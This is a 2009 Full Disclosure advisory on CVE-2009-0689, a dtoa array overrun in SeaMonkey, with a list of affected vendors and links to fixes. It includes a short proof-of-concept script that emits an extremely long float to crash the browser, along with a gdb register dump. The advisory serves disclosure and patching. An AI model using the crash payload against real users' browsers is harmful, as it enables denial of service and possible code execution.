b'From Full Disclosure: http://seclists.org/fulldisclosure/2009/Nov/221\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n[ SeaMonkey 1.1.8 Remote Array Overrun (Arbitrary code execution) ]\n\nAuthor: Maksymilian Arciemowicz and sp3x\nhttp://SecurityReason.com\nDate:\n- - Dis.: 07.05.2009\n- - Pub.: 20.11.2009\n\nCVE: CVE-2009-0689\nRisk: High\nRemote: Yes\n\nAffected Software:\n- - SeaMonkey 1.1.18\n\nFixed in:\n- - SeaMonkey 2.0\n\nNOTE: Prior versions may also be affected.\n\nOriginal URL:\nhttp://securityreason.com/achievement_securityalert/71\n\n\n- --- 0.Description ---\nThe SeaMonkey project is a community effort to develop the SeaMonkey\nall-in-one internet application suite (see below). Such a software suite\nwas previously made popular by Netscape and Mozilla, and the SeaMonkey\nproject continues to develop and deliver high-quality updates to this\nconcept. Containing an Internet browser, email & newsgroup client with\nan included web feed reader, HTML editor, IRC chat and web development\ntools, SeaMonkey is sure to appeal to advanced users, web developers and\ncorporate users.\n\n\n- --- 1. SeaMonkey 1.1.18 Remote Array Overrun (Arbitrary code\nexecution) ---\nThe main problem exist in dtoa implementation. SeaMonkey has the same\ndtoa as a KDE, Opera and all BSD systems. This issue has been fixed in\nFirefox 3.5.4 and fix\n\nhttp://bonsai.mozilla.org/cvsview2.cgi?diff_mode=context&whitespace_mode=show&file=jsdtoa.c&branch=&root=/cvsroot&subdir=mozilla/js/src&command=DIFF_FRAMESET&rev1=3.41&rev2=3.42\n\nhas been used to patch SeaMonkey 2.0.\n\nThis flaw has been detected in may 2009 and signed SREASONRES:20090625.\n\nhttp://securityreason.com/achievement_securityalert/63\n\nbut fix for SREASONRES:20090625, used by openbsd was not good.\nMore information about fix for openbsd and similars SREASONRES:20091030,\n\nhttp://securityreason.com/achievement_securityalert/69\n\nWe can create any number of float, which will overwrite the memory. In\nKmax has defined 15. Functions in dtoa, don\'t checks Kmax limit, and it\nis possible to call 16<= elements of freelist array.\n\n\n- --- 2. Proof of Concept  (PoC) ---\n\n- -----------------------\n<script>\nvar a=0.<?php echo str_repeat("9",299999); ?>;\n</script>\n- -----------------------\n\nIf we use SeaMonkey to  see this PoC, SeaMonkey will crash. For example\n\n- -----------------------\n<script>\nvar a=0.<?php echo str_repeat("1",296450); ?>;\n</script>\n- -----------------------\n\n127# gdb seamonkey-bin seamonkey-bin.core\n...\n#0  0x28df0ecb in ?? ()\n...\n(gdb) i r\neax            0x0      0\necx            0x2      2\nedx            0xbfbfd2fc       -1077947652\nebx            0x28da9b6c       685415276\nesp            0xbfbfd2ac       0xbfbfd2ac\nebp            0xbfbfd2c8       0xbfbfd2c8\nesi            0xb      11\nedi            0xb      11\neip            0x28df0ecb       0x28df0ecb\n...\n\nesi = esi = 11\n\n\n- --- 3. SecurityReason Note ---\n\nOfficialy SREASONRES:20090625 has been detected in:\n- - OpenBSD\n- - NetBSD\n- - FreeBSD\n- - MacOSX\n- - Google Chrome\n- - Mozilla Firefox\n- - Mozilla Seamonkey\n- - KDE (example: konqueror)\n- - Opera\n- - K-Meleon\n\nThis list is not yet closed. US-CERT declared that will inform all\nvendors about this issue, however, they did not do it. Even greater\nconfusion caused new CVE number "CVE-2009-1563". Secunia has informed\nthat this vulnerability was only detected in Mozilla Firefox, but nobody\nwas aware that the problem affects other products like ( KDE, Chrome )\nand it is based on "CVE-2009-0689". After some time Mozilla Foundation\nSecurity Advisory\n("http://www.mozilla.org/security/announce/2009/mfsa2009-59.html";)\nwas updated with note :\n"The underlying flaw in the dtoa routines used by Mozilla appears to be\nessentially the same as that reported against the libc gdtoa routine by\nMaksymilian Arciemowicz ( CVE-2009-0689)".\nThis fact ( new CVE number for Firefox Vulnerability )and PoC in\njavascript (from Secunia), forced us to official notification all other\nvendors. We publish all the individual advisories, to formally show all\nvulnerable software and to avoid wrong CVE number. We do not see any\nother way to fix this issue in all products.\n\nPlease note:\nPatch used in Firefox 3.5.4 does not fully solve the problem. Dtoa\nalgorithm is not optimal and allows remote Denial of Service in Firefox\n3.5.5 giving long float number.\n\n\n- --- 4. Fix ---\nNetBSD fix (optimal):\nhttp://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gdtoa/gdtoaimp.h\n\nOpenBSD fix:\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/sum.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorx.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtord.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorQ.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtof.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtodg.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtod.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/smisc.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/misc.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/hdtoa.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/gethex.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/gdtoa.h\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/dtoa.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/dmisc.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdio/vfprintf.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/arch/vax/gdtoa/strtof.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorxL.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorf.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtordd.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopxL.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopx.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopf.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopdd.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopd.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopQ.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtodnrp.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtodI.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIxL.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIx.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIg.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIf.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIdd.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoId.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIQ.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/qnan.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_xfmt.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_xLfmt.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_ffmt.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_dfmt.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_ddfmt.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g__fmt.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_Qfmt.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/arithchk.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdlib/gcvt.c\nhttp://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdlib/ecvt.c\n\n\n- --- 5. Credits ---\nDiscovered by Maksymilian Arciemowicz and sp3x from SecurityReason.com.\n\n\n- --- 6. Greets ---\nInfospec p_e_a pi3\n\n\n- --- 7. Contact ---\nEmail:\n- - cxib {a.t] securityreason [d0t} com\n- - sp3x {a.t] securityreason [d0t} com\n\nGPG:\n- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg\n- - http://securityreason.com/key/sp3x.gpg\n\nhttp://securityreason.com/\nhttp://securityreason.pl/\n-----BEGIN PGP SIGNATURE-----\n\niEYEARECAAYFAksF2IQACgkQpiCeOKaYa9Z2vgCgvqQwFzfwqYsBNbL2To29/o6D\nZBgAn0bwlhNtD89nVWtxI2Qf0UA7/ZqB\n=JY6k\n-----END PGP SIGNATURE-----'